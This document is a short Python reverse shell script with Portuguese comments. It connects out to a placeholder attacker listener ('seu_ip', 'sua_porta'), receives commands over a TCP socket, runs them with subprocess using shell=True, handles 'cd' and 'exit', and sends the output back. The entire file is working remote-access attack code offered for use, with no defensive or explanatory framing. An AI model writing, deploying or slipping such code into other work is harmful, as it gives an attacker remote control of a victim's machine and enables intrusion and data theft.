#!/usr/bin/python3
# coding: utf-8

import os
import socket
import subprocess

# Define o endereço IP e a porta do seu servidor de escuta
HOST = 'seu_ip'
PORT = sua_porta

def connect():
    # Cria um socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Conecta ao servidor
    s.connect((HOST, PORT))

    while True:
        # Recebe o comando do servidor
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            # Fecha a conexão se o comando for "exit"
            break
        elif command[:2].lower() == "cd":
            # Muda o diretório se o comando começar com "cd"
            try:
                os.chdir(command[3:])
            except:
                pass
        else:
            # Executa o comando no shell
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # Lê a saída do comando
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode('utf-8', errors="replace")
            # Envia a saída de volta ao servidor
            s.send(output_str.encode())

    # Fecha a conexão
    s.close()

if __name__ == '__main__':
    connect()
